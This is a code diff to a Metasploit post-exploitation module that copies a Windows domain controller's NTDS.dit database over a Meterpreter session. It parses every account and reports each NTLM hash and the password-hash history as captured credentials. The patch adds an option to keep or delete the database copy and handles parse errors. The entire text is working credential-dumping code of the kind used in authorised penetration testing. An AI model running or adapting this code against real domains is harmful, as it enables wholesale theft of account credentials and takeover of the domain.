@@ -28,6 +28,9 @@ class MetasploitModule < Msf::Post
       'SessionTypes'  => [ 'meterpreter' ]
   ))
     deregister_options('SMBUser','SMBPass', 'SMBDomain')
+    register_options(
+      [OptBool.new('CLEANUP',
+          [ true, 'Automatically delete ntds backup created', true])])
   end
 
   def run
@@ -40,19 +43,32 @@ class MetasploitModule < Msf::Post
         print_status "Repairing NTDS database after copy..."
         print_status repair_ntds(ntds_file)
         realm = sysinfo["Domain"]
-        ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
-        print_status "Started up NTDS channel. Preparing to stream results..."
-        ntds_parser.each_account do |ad_account|
-          print_good ad_account.to_s
-          report_hash(ad_account.ntlm_hash.downcase, ad_account.name, realm)
-          ad_account.nt_history.each_with_index do |nt_hash, index|
-            hash_string = ad_account.lm_history[index] || Metasploit::Credential::NTLMHash::BLANK_LM_HASH
-            hash_string << ":#{nt_hash}"
-            report_hash(hash_string.downcase,ad_account.name, realm)
+        begin
+		  ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
+		rescue Rex::Post::Meterpreter::RequestError => e
+		  print_bad("Failed to properly parse database: #{e}")
+		  if e.to_s.include? "1004"
+		    print_bad("Error 1004 is likely a jet database error because the ntds database is not in the regular format")
+		  end
+		end
+		unless ntds_parser.nil?
+			print_status "Started up NTDS channel. Preparing to stream results..."
+			ntds_parser.each_account do |ad_account|
+			  print_good ad_account.to_s
+			  report_hash(ad_account.ntlm_hash.downcase, ad_account.name, realm)
+			  ad_account.nt_history.each_with_index do |nt_hash, index|
+				hash_string = ad_account.lm_history[index] || Metasploit::Credential::NTLMHash::BLANK_LM_HASH
+				hash_string << ":#{nt_hash}"
+				report_hash(hash_string.downcase,ad_account.name, realm)
+            end
           end
         end
-        print_status "Deleting backup of NTDS.dit at #{ntds_file}"
-        rm_f(ntds_file)
+        if datastore['cleanup']
+	      print_status "Deleting backup of NTDS.dit at #{ntds_file}"
+          rm_f(ntds_file)
+        else
+          print_bad "#{ntds_file} requires manual cleanup"
+        end
       end
     end
   end
